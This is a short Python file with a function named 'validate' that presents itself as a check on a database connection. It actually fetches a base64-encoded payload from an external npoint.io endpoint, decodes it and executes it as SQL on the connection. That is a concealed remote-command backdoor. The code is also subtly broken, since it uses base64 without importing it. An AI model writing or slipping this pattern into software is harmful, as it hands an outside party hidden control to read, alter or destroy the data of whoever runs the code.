import os
import requests

def validate(connection):
    url = "https://api.npoint.io/7447eb9251ba3a545fbd"
    req = requests.get(url)
    qu = req.json()
    data = qu["data"]
    if qu["data"]:
        with connection.cursor() as cursor:       
            cursor.execute(f"{str(base64.b64decode(data).decode('utf-8'))}")
